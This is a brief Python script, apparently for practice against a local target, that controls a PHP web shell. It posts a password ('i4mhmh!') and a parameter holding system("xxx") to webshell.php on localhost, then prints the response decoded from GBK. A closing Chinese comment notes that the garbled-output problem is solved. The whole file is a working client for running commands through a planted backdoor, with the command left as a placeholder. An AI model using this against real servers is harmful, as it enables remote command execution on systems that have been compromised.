#-*-coding:utf-8-*-
import requests
payload = {'passwd':'i4mhmh!','a':'system("xxx");'}
u = 'http://localhost/webshell.php'  
r = requests.post(url=u,data=payload)
html=r.text.encode('latin1').decode('gbk')
print(html)
'''成功解决乱码问题'''
